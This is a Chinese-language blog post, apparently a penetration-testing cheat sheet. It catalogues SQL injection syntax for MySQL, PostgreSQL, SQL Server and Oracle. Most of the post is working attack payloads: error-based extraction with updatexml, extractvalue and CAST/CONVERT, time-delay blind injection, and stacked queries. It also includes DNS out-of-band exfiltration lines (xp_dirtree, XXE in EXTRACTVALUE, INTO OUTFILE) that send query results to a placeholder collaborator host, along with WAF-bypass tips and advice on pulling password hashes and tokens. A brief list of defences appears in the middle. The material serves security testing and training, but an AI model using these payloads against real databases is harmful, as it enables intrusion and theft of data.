---
title: 【SQL注入】不同数据库的语法差异
comments: true
abbrlink: 180be885
categories:
  - 渗透测试
  - SQL注入
date: 2025-07-09 17:08:19
tags:
description:
top:
---

本 SQL 注入小抄包含有用语法的示例，您可以使用这些语法执行各种任务，这些任务在执行 SQL 注入攻击时经常会出现。

---



### 表结构差异

| 数据库类型     | 关键信息泄露点/系统表                                        | 特点与注意事项                                               |
| -------------- | ------------------------------------------------------------ | ------------------------------------------------------------ |
| **MySQL**      | `information_schema` (schemata, tables, columns)             | MySQL 5.0+才有`information_schema`。盲注时常用`length()`、`substr()`、`ascii()`函数逐字符猜解。 |
| **PostgreSQL** | `pg_database`, `information_schema.tables`, `pg_user`/`pg_shadow` | 权限控制通常较严格。可利用**美元符号引用**（`$$`或`$tag$`）**绕过引号过滤**。可使用`CHR()`函数进行**字符串拼接**绕过引号。 |
| **SQL Server** | `sys.databases`, `sys.tables`, `sys.columns`, `sys.sql_logins` | 注意**权限提升**。若支持外部连接，可用**Navicat**等工具直接连接导出。MSSQL**没有LIMIT语法**，可用`TOP`和子查询模拟。 |
| **Oracle**     | `all_tables`, `all_tab_columns`, `all_users`                 | 语法要求严格。**双查询**在Oracle中较少见。盲注时常用`DECODE()`函数结合`SIGN()`等函数进行逻辑判断。 |

------

### **字符串拼接**

合并多字符串生成新字符串：

| 数据库     | 语法示例                                                     |
| ---------- | ------------------------------------------------------------ |
| Oracle     | `'foo'||'bar'`                                               |
| Microsoft  | `'foo'+'bar'`                                                |
| PostgreSQL | `'foo'||'bar'`                                               |
| MySQL      | `'foo' 'bar'` [注意两个字符串之间的空格] `CONCAT('foo','bar')` |

------

### **字符串拼接方法差异总表**

| 数据库         | 主要操作符/方法   | 示例                                 | 关键特点与利用技巧                                         |
| -------------- | ----------------- | ------------------------------------ | ---------------------------------------------------------- |
| **MySQL**      | `CONCAT()`        | `CONCAT('12', '34')` → `'1234'`      | **最常用**。参数可多个。**任一参数为`NULL`则返回`NULL`**。 |
|                | `空格`            | `'12' '34'` → `'1234'`               | 简便，但可读性差，在注入中不易出错。                       |
|                | `CONCAT_WS()`     | `CONCAT_WS('-', 'a', 'b')` → `'a-b'` | **忽略NULL**。用指定分隔符连接，非常适合注入。             |
| **PostgreSQL** | 双管操作符   `||` | `'12' || '34'` → `'1234'`            | **标准、首选方法**。清晰易用。                             |
|                | `CONCAT()`        | `CONCAT('12', '34')` → `'1234'`      | 类似MySQL，**忽略NULL参数**。                              |
|                | `FORMAT()`        | `FORMAT('Hello %s', 'PostgreSQL')`   | 功能强大，类似printf，可用于复杂拼接。                     |
| **SQL Server** | 加号操作符   `+`  | `'12' + '34'` → `'1234'`             | **最常用、最标准**的方法。                                 |
|                | `CONCAT()`        | `CONCAT('12', '34')` → `'1234'`      | **忽略NULL**（与`+`不同）。2012及以上版本支持。            |
|                | `FORMAT()`        | `FORMAT(123456789, '##-##-#####')`   | 用于格式化，非简单拼接。                                   |
| **Oracle**     | 双管操作符   `||` | `'12' || '34'` → `'1234'`            | **唯一主流方法**。CONCAT函数功能极其有限。                 |
|                | `CONCAT()`        | `CONCAT('12', '34')` → `'1234'`      | **只接受两个参数**。多用`||`。                             |

### **子字符串截取**

从偏移位置截取指定长度（**偏移索引从1开始**），以下示例均返回 `ba`：

| 数据库     | 语法示例                    |
| ---------- | --------------------------- |
| Oracle     | `SUBSTR('foobar', 4, 2)`    |
| Microsoft  | `SUBSTRING('foobar', 4, 2)` |
| PostgreSQL | `SUBSTRING('foobar', 4, 2)` |
| MySQL      | `SUBSTRING('foobar', 4, 2)` |

------

### **注释语法**

截断后续查询语句：

| 数据库     | 语法示例                                                     |
| ---------- | ------------------------------------------------------------ |
| Oracle     | `--comment`                                                  |
| Microsoft  | `--comment` 或 `/*comment*/`                                 |
| PostgreSQL | `--comment` 或 `/*comment*/`                                 |
| MySQL      | `#comment` 或 `-- comment` 【双破折号后需空格】或 `/*comment*/` |

------

### **数据库版本探测**

| 数据库     | 语法示例                                                     |
| ---------- | ------------------------------------------------------------ |
| Oracle     | `SELECT banner FROM v$version` <br/>`SELECT version FROM v$instance` |
| Microsoft  | `SELECT @@version`                                           |
| PostgreSQL | `SELECT version()`                                           |
| MySQL      | `SELECT @@version`                                           |

------

### **数据库内容枚举**

你可以列出数据库中存在的表，以及这些表包含的列。

| 数据库     | 语句                                                         |
| ---------- | ------------------------------------------------------------ |
| Oracle     | `SELECT * FROM all_tables` <br/> `SELECT * FROM all_tab_columns WHERE table_name = 'TABLE-NAME-HERE'` |
| Microsoft  | `SELECT * FROM information_schema.tables` <br/> `SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'` |
| PostgreSQL | `SELECT * FROM information_schema.tables` <br> `SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'` |
| MySQL      | `SELECT * FROM information_schema.tables` <br/> `SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'` |

**列出所有表：**

```sql
-- Oracle
SELECT * FROM all_tables

-- Microsoft/PostgreSQL/MySQL
SELECT * FROM information_schema.tables
```

**查看表字段：**

```sql
-- Oracle
SELECT * FROM all_tab_columns WHERE table_name = '表名'

-- Microsoft/PostgreSQL/MySQL
SELECT * FROM information_schema.columns WHERE table_name = '表名'
```

------

### **条件触发错误**

你可以测试单个布尔条件，如果条件为真，则触发数据库错误：

| 数据库     | 语法示例                                                     |
| ---------- | ------------------------------------------------------------ |
| Oracle     | `SELECT CASE WHEN (条件) THEN TO_CHAR(1/0) ELSE NULL END FROM dual` |
| Microsoft  | `SELECT CASE WHEN (条件) THEN 1/0 ELSE NULL END`             |
| PostgreSQL | `SELECT 1 WHERE 1=(SELECT CASE WHEN (条件) THEN 1/(SELECT 0) ELSE NULL END)` |
| MySQL      | `SELECT IF(条件,(SELECT table_name FROM information_schema.tables),'a')` |

------

### 通过可见错误消息提取数据

你可以测试单个布尔条件，如果条件为真，则触发数据库错误。

| 数据库     | 语句                                                         |
| ---------- | ------------------------------------------------------------ |
| Microsoft  | `SELECT 'foo' WHERE 1 = (SELECT 'secret') > Conversion failed when converting the varchar value 'secret' to data type int.` |
| PostgreSQL | `SELECT CAST((SELECT password FROM users LIMIT 1) AS int) > invalid input syntax for integer: "secret"` |
| MySQL      | `SELECT 'foo' WHERE 1=1 AND EXTRACTVALUE(1, CONCAT(0x5c, (SELECT 'secret'))) > XPATH syntax error: '\secret'` |

---

### 批量（或堆叠）查询

你可以使用批处理查询来连续执行多个查询。请注意，在执行后续查询时，结果不会返回给应用程序。因此，这种技术主要用于盲注漏洞，在这种情况下，你可以使用第二个查询来触发 DNS 查找、条件错误或时间延迟。

| 数据库     | 语法                                                  |
| ---------- | ----------------------------------------------------- |
| Oracle     | `Does not support batched queries.`                   |
| Microsoft  | `QUERY-1-HERE; QUERY-2-HEREQUERY-1-HERE QUERY-2-HERE` |
| PostgreSQL | `QUERY-1-HERE; QUERY-2-HERE`                          |
| MySQL      | `QUERY-1-HERE; QUERY-2-HERE`                          |

使用 MySQL 时，批量查询通常无法用于 SQL 注入。然而，如果目标应用程序使用某些 PHP 或 Python API 与 MySQL 数据库进行通信，偶尔也有可能实现。

### **基于时间延迟的注入**

当查询被处理时，你可以在数据库中造成时间延迟。以下操作将导致无条件的 10 秒时间延迟。

**无条件延迟（10秒）：**

| 数据库     | 语法示例                            |
| ---------- | ----------------------------------- |
| Oracle     | `dbms_pipe.receive_message('a',10)` |
| Microsoft  | `WAITFOR DELAY '0:0:10'`            |
| PostgreSQL | `SELECT pg_sleep(10)`               |
| MySQL      | `SELECT SLEEP(10)`                  |

你可以测试单个布尔条件，如果条件为真，则触发时间延迟。

**条件延迟：**

```sql
-- Oracle
SELECT CASE WHEN (条件) THEN 'a'||dbms_pipe.receive_message('a',10) ELSE NULL END FROM dual

-- Microsoft
IF (条件) WAITFOR DELAY '0:0:10'

-- PostgreSQL
SELECT CASE WHEN (条件) THEN pg_sleep(10) ELSE pg_sleep(0) END

-- MySQL
SELECT IF(条件, SLEEP(10), 'a')
```

------

### **DNS外带数据泄露**

> 你可以让数据库对外部域名执行 DNS 查找。为此，你需要使用 [Burp Collaborator](https://portswigger.net/burp/documentation/desktop/tools/collaborator) 生成一个唯一的 Burp Collaborator 子域名，用于攻击，然后轮询 Collaborator 服务器，确认是否发生了 DNS 查找。

| 数据库    | 语法示例                                                     |
| --------- | ------------------------------------------------------------ |
| Oracle    | （XXE）漏洞触发 DNS 查找。该漏洞已被修补，但仍有许多未打补丁的Oracle安装实例存在:`SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual`以下技术适用于完全打补丁的Oracle安装，但需要提升权限:`SELECT UTL_INADDR.get_host_address('BURP-COLLABORATOR-SUBDOMAIN')` |
| Microsoft | `declare @p varchar(1024);set @p=(SELECT YOUR-QUERY-HERE);exec('master..xp_dirtree "//'+@p+'.BURP-COLLABORATOR-SUBDOMAIN/a"')` |
| MySQL     | The following technique works on Windows only: `SELECT YOUR-QUERY-HERE INTO OUTFILE '\\\\BURP-COLLABORATOR-SUBDOMAIN\a'` |

------

### **防御建议：关键措施**

1. **参数化查询**：强制使用预编译语句（Prepared Statements）
2. **最小权限原则**：数据库账户禁止高阶权限（如DROP/EXECUTE）
3. **输入过滤**：对特殊字符（`'`、`;`、`--`）进行严格转义
4. **错误处理**：禁用详细数据库错误回显
5. **Web防火墙**：部署WAF拦截常见注入特征

### 报错注入

| 数据库类型               | 核心利用函数/方法                   | 触发原理                 | 经典Payload示例 (以获取版本为例)                             | 关键技巧与注意事项                                           |
| ------------------------ | ----------------------------------- | ------------------------ | ------------------------------------------------------------ | ------------------------------------------------------------ |
| **MySQL**                | `updatexml()`                       | 利用XPATH语法错误        | `AND updatexml(1, concat(0x7e, (SELECT version())), 1)`      | **长度限制**：~32字符，用`substr()`分块获取。 **使用`concat(0x7e, ...)`**：`0x7e`(`~`)是非法XPATH字符，保证触发错误，并作为数据起始标志。 |
|                          | `extractvalue()`                    | 利用XPATH语法错误        | `AND extractvalue(1, concat(0x7e, (SELECT version())))`      | 同`updatexml`。                                              |
|                          | `floor()` + `rand()` + `group by`   | 重复键错误               | `AND (SELECT 1 FROM (SELECT count(*), concat(version(), floor(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)` | **无长度限制**，但语句复杂，易出错。`rand(0)*2`是关键。      |
| **PostgreSQL**           | 类型转换错误 `CAST()`               | 故意将字符串转为数值类型 | `AND 1 = CAST((SELECT version()) AS NUMERIC)`                | **简单粗暴**。常与子查询结合。 **权限要求**：普通用户可能无法访问某些系统函数。 |
|                          | 除零错误 `1/0`                      | 利用条件语句触发计算错误 | `AND CASE WHEN 1=1 THEN 1/0 ELSE 1 END`                      | 需能执行条件判断。`CASE`语句非常有用。                       |
| **Microsoft SQL Server** | 类型转换错误 `CONVERT()` / `CAST()` | 类似PostgreSQL           | `AND 1 = CONVERT(INT, (SELECT @@version))`                   | **错误信息非常详细**，常包含完整SQL语句和值，极易利用。      |
|                          | 利用函数参数错误                    | 传入无效参数触发错误     | `AND SUSER_NAME(1/0)`   `AND db_name(1/0)`                   | 探索各种系统函数的边界情况。                                 |
| **Oracle**               | `ctxsys.driload.validate_stmt()`    | 函数参数解析错误         | `AND 1=ctxsys.driload.validate_stmt((SELECT banner FROM v$version WHERE rownum=1))` | **需要`CTXSYS`权限**，但常被授予。                           |
|                          | `utl_inaddr.get_host_name()`        | 解析无效主机名错误       | `AND 1=utl_inaddr.get_host_name((SELECT user FROM dual))`    | **需要网络权限**，常未授予。                                 |
|                          | `dbms_utility.sqlid_to_sqlhash()`   | 参数解析错误             | `AND 1=dbms_utility.sqlid_to_sqlhash((SELECT user FROM dual))` | 11gR2及以上版本可用。                                        |

### **总结用于渗透测试**

1. **指纹识别**：首先通过`@@version`、`version()`、`v$version`等快速判断数据库类型，选择正确的攻击路径。
2. **Payload选择**：
   - **MySQL**：优先尝试`updatexml(1,concat(0x7e,(PAYLOAD)),1)`。
   - **PostgreSQL/MSSQL**：优先尝试类型转换`AND 1=CAST((PAYLOAD) AS NUMERIC/INT)`。
   - **Oracle**：尝试`ctxsys.driload.validate_stmt`或“重复键”技巧。
3. **最大化利用**：
   - 使用聚合函数（如`group_concat`、`string_agg`）一次性获取多行数据。
   - 在Payload中嵌入复杂查询，直接获取密码哈希、Token等核心资产。





## 语法详解

### 报错注入

#### **1. MySQL: 使用 `updatexml` / `extractvalue` 进行高效数据提取**

这是MySQL报错注入的首选方法，因为它语句简单，可靠性高。

- **Payload构造剖析**：

  sql

```
AND updatexml(1, concat(0x7e, (SELECT database()), 0x7e), 1)
```

- `updatexml()`：MySQL的XML处理函数。
- `1`：正常的XPATH路径。
- `concat(0x7e, (...), 0x7e)`：这是**关键**。`0x7e`（`~`）不是合法的XPATH字符，它的插入必然会引发XPATH语法错误。错误信息会包含整个`concat`的结果，即`~database_name~`，从而暴露数据。
- `1`：正常的替换值。

**绕过`GROUP BY`等关键字过滤**：
如果`updatexml`被WAF拦截，可以尝试使用`json_extract`、`json_search`等JSON函数，其原理类似，都是利用非法JSON路径触发错误。

sql

- ```
  AND json_extract('{}', concat('$.', (SELECT version())))
  ```

#### **2. PostgreSQL: 灵活运用类型转换**

PostgreSQL的类型系统非常严格，这为报错注入提供了便利。

- **Payload构造剖析**：

  sql

- ```
  AND 1 = CAST((SELECT string_agg(table_name, ',') FROM information_schema.tables) AS INT)
  ```

  - 子查询`(SELECT ...)`会先执行，获取一个字符串结果（例如`users,products,config`）。
  - `CAST(... AS INT)`试图将这个字符串转换为整数，必然失败，并在错误信息中包含这个字符串本身。

#### **3. Microsoft SQL Server: 详尽的错误信息**

MSSQL的错误信息通常是“最友好”的，经常会直接返回引发错误的变量值。

- **Payload构造剖析**：

  sql

- ```
  AND 1 = CONVERT(INT, (SELECT TOP 1 name FROM sysobjects WHERE xtype='U'))
  ```

  - 错误信息通常会包含：`Conversion failed when converting the varchar value '**users**' to data type int.`
  - 这样，表名`users`就直接暴露了。

#### **4. Oracle: 利用权限函数**

Oracle的报错注入通常依赖于调用有权限要求的高级函数。

- **Payload构造剖析**：

  sql

- ```
  SELECT COUNT(*), (SELECT banner FROM v$version WHERE rownum=1) FROM dual GROUP BY (SELECT banner FROM v$version WHERE rownum=1)
  ```

  - 这是一个“重复键”错误的变种，利用了`GROUP BY`子句中的子查询。























本文参考：
